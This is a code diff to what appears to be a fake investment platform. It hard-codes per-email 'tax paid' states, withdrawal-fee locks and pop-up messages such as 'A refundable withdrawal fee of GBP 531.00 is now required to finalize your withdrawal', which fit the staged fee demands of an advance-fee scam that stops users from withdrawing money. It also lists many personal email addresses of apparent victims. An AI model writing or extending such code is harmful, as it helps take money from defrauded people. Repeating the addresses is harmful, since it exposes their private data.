@@ -384,8 +384,8 @@ const MANUAL_PROGRESS_OVERRIDES: Record<
     currentValue: 6700,
     taxRate: 0.165,
     taxDue: 587,
-    taxRemaining: 587,
-    taxPaid: 0,
+    taxRemaining: 0,
+    taxPaid: 587,
     initialHoldings: 500,
     currency: "GBP",
     forceProgressPct: 100,
@@ -433,7 +433,8 @@ const WITHDRAWAL_FEE_LOCK_BY_EMAIL: Record<string, { amount: number; currency: "
   "samlebrun01@gmail.com": { amount: 680, currency: "USD" },
   "ttvcurser@gmail.com": { amount: 500, currency: "GBP" },
   "tzahielk@gmail.com": { amount: 450, currency: "GBP" },
-  "ajamibilal@yahoo.com": { amount: 493, currency: "USD" }
+  "ajamibilal@yahoo.com": { amount: 493, currency: "USD" },
+  "obitoplutowrld@gmail.com": { amount: 531, currency: "GBP" }
 };
 const WITHDRAWAL_FEE_ALERT_BY_EMAIL: Record<string, string> = {
   "ammielcui@gmail.com": "Withdrawal fee payment required: GBP 1,275.00. Clear this fee to continue.",
@@ -446,6 +447,8 @@ const WITHDRAWAL_FEE_ALERT_BY_EMAIL: Record<string, string> = {
   "ajamibilal@yahoo.com":
     "Tax cleared successfully. Congratulations. To proceed with withdrawal, please clear the withdrawal fee of $493.00."
   ,
+  "obitoplutowrld@gmail.com":
+    "Congratulations on clearing your taxes. A refundable withdrawal fee of GBP 531.00 is now required to finalize your withdrawal.",
   "josiahbauman03@gmail.com":
     "Congratulations on clearing your taxes. Final step: your GBP 5,000.00 withdrawal is pending for your transaction to be approved."
 };
@@ -491,6 +494,9 @@ const TAX_CLEARED_POPUP_BY_EMAIL: Record<string, string> = {
     "Tax cleared successfully. Please clear the withdrawal fee of GBP 500.00 to proceed with withdrawal.",
   "ajamibilal@yahoo.com":
     "Tax cleared successfully. Congratulations. To proceed with withdrawal, please clear the withdrawal fee of $493.00."
+  ,
+  "obitoplutowrld@gmail.com":
+    "Congratulations on clearing your taxes. A refundable withdrawal fee of GBP 531.00 is now required to finalize your withdrawal."
 };
 const USER_PLAN_OVERRIDE_BY_EMAIL: Record<
   string,
